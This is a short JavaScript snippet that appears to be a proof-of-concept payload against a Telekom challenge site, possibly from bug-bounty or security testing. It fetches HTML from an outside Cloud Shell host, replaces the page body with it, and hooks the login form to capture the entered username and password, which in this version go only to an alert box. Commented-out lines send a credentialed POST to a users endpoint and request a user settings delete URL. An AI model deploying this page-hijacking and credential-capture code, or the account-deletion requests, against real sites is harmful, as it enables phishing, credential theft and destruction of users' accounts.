fetch("https://8080-cs-8ea4b567-821e-470a-baa0-84c7db793d86.cs-asia-southeast1-bool.cloudshell.dev/rce.php").then(res=>res.text()).then(res => {


  document.body.innerHTML = res;

  const form = document.querySelector('#aa');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('#user').value
    let pass = document.querySelector('#pass').value
    alert('Login: ' + login + " password: " + pass);

    return;
  }, true);
})

// fetch("https://challenge.telekom.com/en/users", { "method": "POST", "credentials": "include"})


// fetch("https://challenge.telekom.com/en/user/settings/delete")
